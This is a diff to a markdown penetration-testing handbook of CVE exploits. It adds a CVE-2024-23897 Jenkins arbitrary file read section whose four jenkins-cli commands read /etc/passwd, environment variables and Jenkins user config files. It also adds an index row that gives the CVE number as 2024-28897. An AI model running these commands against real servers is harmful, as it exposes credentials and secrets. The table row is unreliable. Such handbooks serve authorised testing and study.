@@ -33,6 +33,7 @@
 - [CVE-2023-4911: Looney Tunables LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-4911-Looney-Tunables-LPE)
 - [CVE-2023-7028: GitLab Account Takeover](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-7028-GitLab-Account-Takeover)
 - [CVE-2024-21626: Leaky Vessels Container Escape](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2024-21626-Leaky-Vessels-Container-Escape)
+- [CVE-2024-23897: Jenkins Arbitrary File Read](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2024-23897-Jenkins-Arbitrary-File-Read)
 - [GodPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#GodPotato-LPE)
 - [Juicy Potato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Juicy-Potato-LPE)
 - [JuicyPotatoNG LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#JuicyPotatoNG-LPE)
@@ -150,6 +151,7 @@
 | CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
 | CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
 | CVE-2024-21626 | Leaky Vessels Container Escape | https://github.com/Wall1e/CVE-2024-21626-POC |
+| CVE-2024-28897 | Jenkins Arbitrary File Read | https://github.com/CKevens/CVE-2024-23897 |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
@@ -1389,6 +1391,17 @@ It can be the case that the `file descriptor` needs to be incremented until it s
 
 ```c
 $ cat ../../../../etc/shadow
+```
+
+## CVE-2024-23897: Jenkins Arbitrary File Read
+
+> https://github.com/CKevens/CVE-2024-23897
+
+```c
+$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' help "@/etc/passwd"
+$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' help "@/proc/self/environ"
+$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' connect-node "@/var/jenkins_home/users/users.xml"
+$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' connect-node "@/var/jenkins_home/users/<USERNAME>_12108429903186576833/config.xml"
 ```
 
 ## GodPotato LPE
